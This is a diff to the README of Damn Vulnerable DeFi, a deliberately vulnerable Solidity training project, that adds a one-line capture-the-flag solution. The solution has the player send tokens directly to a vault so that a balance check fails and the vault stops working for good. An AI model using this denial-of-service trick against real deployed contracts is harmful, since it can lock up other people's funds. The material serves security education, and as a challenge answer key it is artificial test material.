@@ -17,3 +17,11 @@ For Q&A and troubleshooting running Damn Vulnerable DeFi, go [here](https://gith
 All Solidity code, practices and patterns in this repository are DAMN VULNERABLE and for educational purposes only.
 
 DO NOT USE IN PRODUCTION.
+
+Fix #1:        
+````
+// lets transfer some amount directly to vault and make the if logic fail forever
+await token.connect(player).transfer(vault.address, 10);
+````
+
+
